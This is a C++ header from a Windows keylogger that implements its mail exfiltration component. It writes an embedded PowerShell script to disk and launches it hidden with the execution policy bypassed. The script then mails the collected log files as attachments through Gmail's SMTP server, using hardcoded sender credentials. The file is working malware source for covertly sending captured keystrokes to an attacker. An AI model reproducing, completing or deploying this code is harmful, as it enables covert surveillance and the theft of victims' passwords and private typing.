#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

// photoshop has the same file extension ps1 so be cautious
#define SCRIPT_NAME "sm.ps1"

namespace Mail {

    // keylogger works with gmail email by default
    // other type of emails may not work
    #define X_EM_TO   "something@gmail.com"
    #define X_EM_FROM "something@gmail.com"
    #define X_EM_PASS "qwerty1234"

//No need to change the following content
const std::string &PowerShellScript =
"Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"#attachment not found, or.. dont have permission\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; #everything went OK\r\n          }\r\n      catch\r\n          {\r\n            exit 3; #error,"
" something went wrong :(\r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; #well, calling the function is wrong? not enough parameters\r\n    }";


    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS

    std::string StringReplace(std::string s, const std::string &what, const std::string &with) {

        if(what.empty()) {

            return s;
        }
        size_t sp = 0; // sp - String Position

        while((sp = s.find(what, sp)) != std::string::npos) { // npos = our string to termination

            s.replace(sp, what.length(), with), sp += with.length();
        }
        return s;
    }

    bool CheckFileExists(const std::string &f) {

        std::ifstream file (f);
        return (bool)file;
    }

    bool CreateScript() {

        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

        if(!script) { // checks if the file was created

            return false;
        }

        script << PowerShellScript;

        if(!script) { // checks if the file was written

            return false;
        }

        script.close();

        return true;
    }

    Timer m_timer; // global variable so it's not destroyed at the end of the function
                   // therefore, if the mail-send fails, function is repeatable

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments) {

        bool ok;

        ok = IO::MkDir(IO::GetOurPath(true));

        if(!ok) { //If !ok is evaluated to true, the directory is not created

            return -1;
        }

        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        if(!CheckFileExists(scr_path)) {

            ok = CreateScript();
        }

        if(!ok) { // checks if the creation of the file was successful

            return -2; // creation was unsuccessful
        }

        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                            + StringReplace(subject, "\"", "\\\"") +
                            "\" -Body \""
                            + StringReplace(body, "\"", "\\\"") +
                            "\" -Att \"" + attachments + "\"";

        SHELLEXECUTEINFO ShExecInfo = {0};

        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);

        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS; // prevents process from closing so we can see its performance

        ShExecInfo.hwnd = NULL; // makes sure Keylogger doesn't need this handler/window open

        ShExecInfo.lpVerb = "open"; // similar to right clicking a file and then click the 'Open' option

        ShExecInfo.lpFile = "powershell";

        ShExecInfo.lpParameters = param.c_str(); // turn the param content into c code

        ShExecInfo.lpDirectory = NULL;

        ShExecInfo.nShow = SW_HIDE; // window won't pop as desired

        ShExecInfo.hInstApp = NULL; // this handles the instance

        ok = (bool)ShellExecuteEx(&ShExecInfo);

        // in the case that the script cannot be executed
        if(!ok) {

            return -3;
        }

        //integer is in milliseconds
        //Therefore 7000 ms = 7 seconds
        WaitForSingleObject(ShExecInfo.hProcess, 7000);

        //DWORD comes from WindowsAPI
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        //Lambda function or anonymous function
        m_timer.SetFunction([&]() {

            WaitForSingleObject(ShExecInfo.hProcess, 60000); // Wait 1 min
            GetExitCodeProcess (ShExecInfo.hProcess, &exit_code); // get exit code

            if((int)exit_code == STILL_ACTIVE) { //259 exit code means it is still running
                TerminateProcess(ShExecInfo.hProcess, 100);
            }
            Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
        });

        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);

        return (int)exit_code;
    }

    //Overloading because we sending multiple attachments
    int SendMail(const std::string &subject,
                 const std::string &body,
                 const std::vector<std::string> &att) {

            std::string attachments = "";

            if(att.size() == 1U) { // 1U means unsigned integer
                attachments = att.at(0);
            }

            //else build a string of attachments
            for(const auto &v : att) {
                attachments += v + "::";
            }
            attachments = attachments.substr(0, attachments.length() - 2);



            return SendMail(subject, body, attachments);
    }
}

#endif // SENDMAIL_H
